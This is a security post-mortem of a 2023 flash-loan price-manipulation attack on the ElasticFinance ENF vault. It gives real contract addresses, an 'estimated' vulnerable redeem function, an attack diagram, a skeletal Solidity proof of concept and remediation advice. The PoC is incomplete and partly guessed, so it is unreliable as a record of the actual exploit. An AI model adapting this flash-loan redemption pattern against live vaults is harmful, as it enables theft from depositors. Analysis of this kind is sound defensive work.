# EFVault (ElasticFinance) — Vault Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-27 |
| **Protocol** | ElasticFinance Vault (ENF) |
| **Chain** | Ethereum |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0x1fe5a534...](https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914) |
| **Vulnerable Contract** | [0xBDB51502...](https://etherscan.io/address/0xBDB515028A6fA6CD1634B5A9651184494aBfD336) |
| **Root Cause** | Vault share price calculation directly references AMM spot reserves without TWAP, enabling price distortion via reserve manipulation within a single block |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/EFVault_exp.sol) |

---
## 1. Vulnerability Overview

ElasticFinance's ENF vault is a yield vault that accepts USDC deposits and mints share tokens. When the `redeem()` function is called to exchange shares back to USDC, the internal price calculation relies on spot liquidity. This allows an attacker to manipulate the vault's asset price via a flash loan to obtain a favorable redemption ratio.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable vault share price calculation
interface IENF is IERC20 {
    function redeem(uint256 shares, address receiver) external;
}

// Estimated vulnerable implementation
function redeem(uint256 shares, address receiver) external {
    // ❌ totalAssets() relies solely on the current USDC balance
    uint256 totalAssets = USDC.balanceOf(address(this)) + getExternalAssets();
    uint256 totalShares = totalSupply();

    // Favorable redemption ratio calculated using manipulated totalAssets
    uint256 usdcAmount = shares * totalAssets / totalShares;
    USDC.transfer(receiver, usdcAmount);
    _burn(msg.sender, shares);
}

// ✅ Fix: Use time-weighted asset value
function redeem(uint256 shares, address receiver) external {
    uint256 totalAssets = getTimeWeightedAssets();  // TWAP-based calculation
    // ...
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Vault share price calculation directly references AMM spot reserves without TWAP, enabling price distortion via reserve manipulation within a single block
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Borrow large amount of USDC via flash loan
  │
  ├─2─▶ Deposit USDC into vault → receive ENF shares
  │       (normal share price at this point)
  │
  ├─3─▶ Manipulate vault external asset prices
  │       (positions in Curve/Convex etc. managed by the vault)
  │
  ├─4─▶ ENF.redeem(shares, receiver)
  │       Manipulated totalAssets → receive more USDC
  │
  └─5─▶ Repay flash loan → realize net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    IENF ENF = IENF(0xBDB515028A6fA6CD1634B5A9651184494aBfD336);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testExploit() public {
        // 1. Borrow USDC via flash loan
        uint256 flashAmount = 10_000_000 * 1e6;  // 10 million USDC
        flashLoan(flashAmount);
    }

    function executeExploit(uint256 usdcAmount) internal {
        // 2. Deposit USDC into vault
        USDC.approve(address(ENF), usdcAmount);
        uint256 sharesBefore = ENF.balanceOf(address(this));

        // 3. Manipulate vault assets (distort external yield position prices)
        manipulateVaultAssets();

        // 4. Redeem shares at manipulated price
        // Receive more USDC than originally deposited
        ENF.redeem(ENF.balanceOf(address(this)), address(this));

        // 5. Additional USDC gained = net profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Vault share price manipulation |
| **Attack Vector** | Flash Loan + vault asset value distortion |
| **Impact Scope** | All vault depositors |
| **DASP Classification** | Oracle Manipulation |
| **CWE** | CWE-20: Improper Input Validation |

## 6. Remediation Recommendations

1. **TWAP-based asset valuation**: Use a time-weighted average instead of instantaneous value.
2. **Deposit/withdrawal interval restriction**: Prevent immediate withdrawal in the same block after deposit.
3. **EIP-4626 standard implementation**: Follow the security best practices of the standardized vault interface.

## 7. Lessons Learned

- Yield vaults must verify whether the internal asset value calculation is manipulable.
- PeckShield, drdr_zz, and gbaleeeee all analyzed this incident.
- EIP-4626 standard vaults can be subject to the same vulnerability depending on their price calculation method.